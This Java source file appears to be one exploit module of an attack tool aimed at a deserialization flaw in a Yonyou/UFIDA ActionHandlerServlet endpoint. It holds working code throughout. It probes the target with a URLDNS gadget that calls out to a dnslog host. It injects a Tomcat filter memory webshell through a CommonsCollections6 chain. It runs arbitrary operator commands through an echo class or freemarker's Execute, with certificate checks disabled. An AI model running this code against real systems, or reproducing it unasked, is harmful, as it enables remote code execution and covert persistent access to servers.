package com.chave.vuln;

import com.chave.config.Config;
import com.chave.config.ClassCode;
import com.chave.config.ClassName;
import com.chave.config.Mod;
import com.chave.gadget.chain.CommonsCollections6_Array;
import com.chave.gadget.chain.URLDNS;
import com.chave.proxy.HttpProxy;
import com.chave.utils.*;
import javafx.scene.control.TextArea;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.zip.GZIPOutputStream;

public class ActionHandlerServlet_Unserialize extends VulnBase {
    public static boolean DNSLOG = true;
    public static boolean JNDI = false;
    public static boolean EXEC = true;
    public static boolean UPLOAD = false;
    public static boolean GETSHELL = true;

    private String flag = "yyds";

    public ActionHandlerServlet_Unserialize() {
        super();
    }

    public ActionHandlerServlet_Unserialize(TextArea log, TextArea uploadLog, TextArea execLog) {
        super(log, uploadLog, execLog);
    }

    @Override
    public void exploit() {
        String vulnerable_url = Config.TARGET + "/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet";

        try {
            // 调用对应方法
            if (Config.MOD.equals(Mod.POC)) {
                poc(vulnerable_url);
            } else if (Config.MOD.equals(Mod.EXP)) {
                exp_cc6(vulnerable_url);
            } else if (Config.MOD.equals(Mod.EXEC)) {
                if (exec_cc6(vulnerable_url)) {
                    return;
                } else {
                    if (exec_freemarker(vulnerable_url)) {
                        return;
                    } else {
                        logExec("[-] freemarker.template.utility.Execute 执行失败.");
                    }
                }
            }

        } catch (Exception e) {
        }
    }

    private void poc(String url) {
        try {
            if (Config.DNSLOG == null) {
                logMessage("[-] 请输入 dnslog 信息.");
                return;
            }

            ByteArrayOutputStream urldns_baos = new ByteArrayOutputStream();
            GZIPOutputStream urldns_gzipOS = new GZIPOutputStream(urldns_baos);

            urldns_gzipOS.write(Util.getSerializedData(URLDNS.getObject("ActionHandlerServlet." + Config.DNSLOG)));

            urldns_gzipOS.close(); // 关闭流

            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            // 发送请求
            URL apiUrl = new URL(url);
            byte[] compressData = urldns_baos.toByteArray();
            HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(urldns_conn);

            // 设置请求头
            urldns_conn.setRequestProperty("Content-Type", "application/octet-stream");
            urldns_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));

            // post 请求
            MyHttpUtil.post(urldns_conn, compressData);

            // 处理响应
            int responseCode = MyHttpUtil.getResponseCode(urldns_conn);
            if (responseCode == HttpURLConnection.HTTP_OK) {
                logMessage("[+] ActionHandlerServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
            } else {
                logMessage("[-] ActionHandlerServlet 反序列化探测失败. 状态码: " + responseCode);
            }

            urldns_conn.disconnect();
        } catch (Exception e) {
            logMessage("[-] ActionHandlerServlet 反序列化探测失败. " + e);
        }

    }

    private boolean exp_cc6(String url) {
        try {
            ByteArrayOutputStream exp_cc6_baos = new ByteArrayOutputStream();
            GZIPOutputStream exp_cc6_gzipOS = new GZIPOutputStream(exp_cc6_baos);

            exp_cc6_gzipOS.write(Util.getSerializedData(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.TomcatFilterMemshellFromThread, ClassCode.Tomcat7_FilterMemshellFromThread_JDK7})));

            exp_cc6_gzipOS.close(); // 关闭流

            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            //发送请求
            URL apiUrl = new URL(url);
            byte[] compressData = exp_cc6_baos.toByteArray();
            HttpURLConnection exp_cc6_conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(exp_cc6_conn);

            // 设置请求头
            exp_cc6_conn.setRequestProperty("Content-Type", "application/octet-stream");
            exp_cc6_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));

            // post 请求
            MyHttpUtil.post(exp_cc6_conn, compressData);

            // 处理响应
            int responseCode = MyHttpUtil.getResponseCode(exp_cc6_conn);
            if (responseCode == HttpURLConnection.HTTP_OK) {
                logMessage("[+] Filter 类型内存马注入成功, 请手动连接验证.");
                exp_cc6_conn.disconnect();
                return true;
            } else {
                // 请求失败
                logMessage("[-] 请求失败. 状态码: " + responseCode);
                exp_cc6_conn.disconnect();
                return false;
            }

        } catch (Exception e) {
            logMessage("[-] 内存马注入失败, 请尝试手动利用. " + e.toString());
            return false;
        }

    }

    private boolean exec_cc6(String url) {
        try {

            ByteArrayOutputStream exec_cc6_baos = new ByteArrayOutputStream();
            GZIPOutputStream exec_cc6_gzipOS = new GZIPOutputStream(exec_cc6_baos);

            exec_cc6_gzipOS.write(Util.getSerializedData(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4})));

            exec_cc6_gzipOS.close(); // 关闭流

            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            // 发送请求
            URL apiUrl = new URL(url);
            byte[] compressData = exec_cc6_baos.toByteArray();
            HttpURLConnection exec_cc6_poc_conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(exec_cc6_poc_conn);

            // 设置请求头
            exec_cc6_poc_conn.setRequestProperty("Content-Type", "application/octet-stream");
            exec_cc6_poc_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
            exec_cc6_poc_conn.setRequestProperty("testzxcv4", flag + Util.byteCodeToBase64("echo yyds".getBytes()));

            // post 请求
            MyHttpUtil.post(exec_cc6_poc_conn, compressData);

            int cc6PocResponseCode = MyHttpUtil.getResponseCode(exec_cc6_poc_conn);
            String cc6PocResponseText = MyHttpUtil.getResponseText(exec_cc6_poc_conn);
            if (cc6PocResponseCode == HttpURLConnection.HTTP_OK && cc6PocResponseText.contains(flag)) {
                // 创建新连接
                HttpURLConnection exec_cc6_exp_conn = (HttpURLConnection) apiUrl.openConnection();

                // 设置超时
                MyHttpUtil.setTimeout(exec_cc6_exp_conn);

                exec_cc6_exp_conn.setRequestProperty("Content-Type", "application/octet-stream");
                exec_cc6_exp_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));
                exec_cc6_exp_conn.setRequestProperty("testzxcv4", flag + Util.byteCodeToBase64(Config.CMD.getBytes()));
                MyHttpUtil.post(exec_cc6_exp_conn, compressData);

                int cc6ExpResponseCode = MyHttpUtil.getResponseCode(exec_cc6_exp_conn);
                String cc6ExpResponseText = MyHttpUtil.getResponseText(exec_cc6_exp_conn);

                if (cc6ExpResponseCode == HttpURLConnection.HTTP_OK && cc6ExpResponseText.length() != 0) {
                    logExec("[+] CommonsCollections6 执行成功!\n" + cc6ExpResponseText);
                    return true;
                } else {
                    logExec("[-] CommonsCollections6 执行失败, 尝试 freemarker.template.utility.Execute 执行.");
                    return false;
                }
            } else {
                logExec("[-] CommonsCollections6 执行失败, 尝试 freemarker.template.utility.Execute 执行.");
                return false;
            }
        } catch (Exception e) {
            logExec("[-] CommonsCollections6 执行失败, 尝试 freemarker.template.utility.Execute 执行. " + e);
            return false;
        }
    }

    private boolean exec_freemarker(String url) {
        try {
            ByteArrayOutputStream exec_freemarker_baos = new ByteArrayOutputStream();
            GZIPOutputStream exec_freemarker_gzipOS = new GZIPOutputStream(exec_freemarker_baos);
            ObjectOutputStream oos = new ObjectOutputStream(exec_freemarker_gzipOS);

            // 设置全局http代理
            HttpProxy.setProxy();

            // 忽略ssl证书
            SSLUtil.trustAllCertificates();

            oos.writeObject("freemarker.template.utility.Execute");
            oos.writeObject(Mod.EXEC);
            ArrayList list = new ArrayList();
            list.add(Config.CMD);
            oos.writeObject(list);
            oos.writeObject("yyds");
            oos.writeObject("yyds");
            exec_freemarker_gzipOS.close();

            //发送请求
            URL apiUrl = new URL(url);
            byte[] compressData = exec_freemarker_baos.toByteArray();
            HttpURLConnection exec_freemarker_conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(exec_freemarker_conn);

            // 设置请求头
            exec_freemarker_conn.setRequestProperty("Content-Type", "application/octet-stream");
            exec_freemarker_conn.setRequestProperty("Content-Length", String.valueOf(compressData.length));

            MyHttpUtil.post(exec_freemarker_conn, compressData);

            int freemarkerExpResponseCode = MyHttpUtil.getResponseCode(exec_freemarker_conn);
            String freemarkerExpResponseText = MyHttpUtil.getResponseText(exec_freemarker_conn);


            // 处理响应
            if (freemarkerExpResponseCode == HttpURLConnection.HTTP_OK) {
                // 去除响应中多余字符
                freemarkerExpResponseText = freemarkerExpResponseText.substring(48);

                logExec("[+] freemarker.template.utility.Execute 执行成功!\n" + freemarkerExpResponseText);
                return true;
            } else {
                logExec("[-] freemarker.template.utility.Execute 执行失败. 请尝试手动利用.\n");
                return false;
            }
        } catch (Exception e) {
            logExec("[-] freemarker.template.utility.Execute 执行失败. 请尝试手动利用. " + e);
            return false;
        }

    }

}
